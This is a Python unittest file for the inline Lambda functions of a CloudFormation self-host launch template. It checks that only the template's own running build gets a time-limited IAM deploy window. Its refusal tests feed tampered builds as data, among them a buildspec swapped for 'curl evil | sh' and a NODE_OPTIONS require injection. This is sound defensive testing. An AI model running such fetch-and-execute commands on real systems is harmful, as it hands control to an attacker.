"""The Launch Stack's inline functions (infra/cfn/coderhelm-selfhost-launch.yaml),
run against fake AWS clients: the window function gives the deploy window
only to this template's own running build, bound to its session; the
starter answers CloudFormation on every request and closes a leftover
window on delete, so a rollback never stops at the installer role.

Run: python3 -m unittest discover -s lambda/tests
"""

import hashlib
import importlib.util
import json
import pathlib
import re
import sys
import types
import unittest

TEMPLATE = pathlib.Path(__file__).resolve().parents[2] / "infra" / "cfn" / "coderhelm-selfhost-launch.yaml"


def inline_code(resource):
    """The ZipFile block of one resource (the template is YAML; no parser needed)."""
    text = TEMPLATE.read_text()
    start = text.index(f"\n  {resource}:\n")
    block = text[start:]
    m = re.search(r"\n        ZipFile: \|\n((?:          .*\n|\n)+)", block)
    return "\n".join(line[10:] for line in m.group(1).split("\n"))


def buildspec():
    text = TEMPLATE.read_text()
    m = re.search(r"\n        BuildSpec: \|\n((?:          .*\n|\n)+)", text)
    return "\n".join(line[10:] for line in m.group(1).split("\n"))


def norm(t):
    return "\n".join(line.rstrip() for line in t.strip().splitlines())


ROLE_ID = "AROAINSTALLERROLE01"


class Fakes:
    def __init__(self, build):
        self.build = build
        self.policies = {}
        self.deleted = []

    def client(self, name, **_):
        f = self

        class C:
            def batch_get_builds(self, ids):
                return {"builds": [f.build] if f.build else []}

            def get_role(self, RoleName):
                return {"Role": {"RoleId": ROLE_ID}}

            def put_role_policy(self, RoleName, PolicyName, PolicyDocument):
                f.policies[(RoleName, PolicyName)] = PolicyDocument

            def delete_role_policy(self, RoleName, PolicyName):
                f.deleted.append((RoleName, PolicyName))
                if (RoleName, PolicyName) not in f.policies:
                    raise Exception("NoSuchEntity")
                del f.policies[(RoleName, PolicyName)]

            def get_parameter(self, Name):
                i = Name.rsplit("/", 1)[1]
                return {"Parameter": {"Value": json.dumps([{"Sid": f"Part{i}", "Effect": "Allow", "Action": "cloudformation:UpdateStack", "Resource": "*",
                                                            "Condition": {"StringEquals": {"aws:userid": "__CODERHELM_USER_ID__"}, "DateLessThan": {"aws:CurrentTime": "__CODERHELM_EXPIRES__"}}}])}}

            def start_build(self, **kw):
                f.started = kw

        return C()


def load(resource, fakes, env=None):
    sys.modules["boto3"] = types.SimpleNamespace(client=fakes.client)
    import os
    os.environ.update(env or {})
    mod = types.ModuleType(resource)
    exec(compile(inline_code(resource), resource, "exec"), mod.__dict__)
    return mod


VARS = "VERSION,STAGE,WAIT_URL,ACCESS_ID,INSTALLER_ROLE"
ENV = {"PROJECT": "launch-installer", "ROLE": "coderhelm-prod-installer-1a2b3c4d", "IMAGE": "aws/codebuild/standard:7.0",
       "PARAM": "/coderhelm-prod/launch-1a2b3c4d/window-policy", "PARTS": "2",
       "BUILDSPEC_SHA256": hashlib.sha256(norm(buildspec()).encode()).hexdigest(), "VARIABLES": VARS}


def build(**over):
    b = {"projectName": "launch-installer", "buildStatus": "IN_PROGRESS",
         "source": {"type": "NO_SOURCE", "buildspec": buildspec() + "\n  "},
         "environment": {"image": "aws/codebuild/standard:7.0", "privilegedMode": False,
                         "environmentVariables": [{"name": "VERSION", "value": "v0.8.0", "type": "PLAINTEXT"}, {"name": "WAIT_URL", "value": "https://x", "type": "PLAINTEXT"}]},
         "serviceRole": "arn:aws:iam::111122223333:role/coderhelm-prod-installer-1a2b3c4d"}
    b.update(over)
    return b


class WindowFunction(unittest.TestCase):
    def ask(self, b, user_id=f"{ROLE_ID}:AWSCodeBuild-1111"):
        f = Fakes(b)
        mod = load("WindowFunction", f, ENV)
        return mod.handler({"build_id": "launch-installer:1111", "user_id": user_id}, None), f

    def test_this_templates_running_build_gets_a_window_bound_to_its_session(self):
        r, f = self.ask(build())
        self.assertTrue(r["ok"], r)
        doc = json.loads(f.policies[("coderhelm-prod-installer-1a2b3c4d", "deploy-window")])
        self.assertEqual([s["Sid"] for s in doc["Statement"]], ["Part1", "Part2"])
        for s in doc["Statement"]:
            self.assertEqual(s["Condition"]["StringEquals"]["aws:userid"], f"{ROLE_ID}:AWSCodeBuild-1111")
            self.assertEqual(s["Condition"]["DateLessThan"]["aws:CurrentTime"], r["until"])

    def test_an_edited_or_overridden_build_gets_nothing(self):
        cases = {
            "buildspec": build(source={"type": "NO_SOURCE", "buildspec": buildspec().replace("node launch-bootstrap.mjs", "curl evil | sh")}),
            "image": build(environment=dict(build()["environment"], image="evil:1")),
            "sets NODE_OPTIONS": build(environment=dict(build()["environment"], environmentVariables=[{"name": "NODE_OPTIONS", "value": "--require /x"}])),
            "source": build(source={"type": "S3", "buildspec": buildspec()}),
            "not running": build(buildStatus="SUCCEEDED"),
            "another role": build(serviceRole="arn:aws:iam::111122223333:role/admin"),
            "not this stack's": build(projectName="other-installer"),
        }
        for why, b in cases.items():
            with self.subTest(why):
                r, f = self.ask(b)
                self.assertFalse(r["ok"])
                self.assertIn("refused", r["error"])
                self.assertEqual(f.policies, {})

    def test_a_caller_that_is_not_the_installer_role_gets_nothing(self):
        for uid in ["AROAOTHER0000000001:x", "AIDAUSER", f"{ROLE_ID}:bad name with spaces"]:
            with self.subTest(uid):
                r, f = self.ask(build(), user_id=uid)
                self.assertFalse(r["ok"])
                self.assertEqual(f.policies, {})


class Starter(unittest.TestCase):
    def run_event(self, kind, fakes):
        mod = load("StarterFunction", fakes)
        sent = []
        mod.respond = lambda event, context, status, reason="": sent.append(status)
        event = {"RequestType": kind, "ResourceProperties": {"Project": "p", "InstallerRole": "coderhelm-prod-installer-1a2b3c4d", "WaitUrl": "https://w", "Bucket": "", "Version": "v1", "Stage": "prod", "Region": "us-east-1"}}
        mod.handler(event, types.SimpleNamespace(log_stream_name="s"))
        return sent

    def test_delete_closes_a_leftover_window_and_answers(self):
        f = Fakes(None)
        f.policies[("coderhelm-prod-installer-1a2b3c4d", "deploy-window")] = "{}"
        self.assertEqual(self.run_event("Delete", f), ["SUCCESS"])
        self.assertEqual(f.policies, {})

    def test_delete_without_a_window_still_answers(self):
        f = Fakes(None)
        self.assertEqual(self.run_event("Delete", f), ["SUCCESS"])
        self.assertEqual(f.deleted, [("coderhelm-prod-installer-1a2b3c4d", "deploy-window")])

    def test_update_answers_and_starts_nothing(self):
        f = Fakes(None)
        self.assertEqual(self.run_event("Update", f), ["SUCCESS"])
        self.assertFalse(hasattr(f, "started"))


if __name__ == "__main__":
    unittest.main()
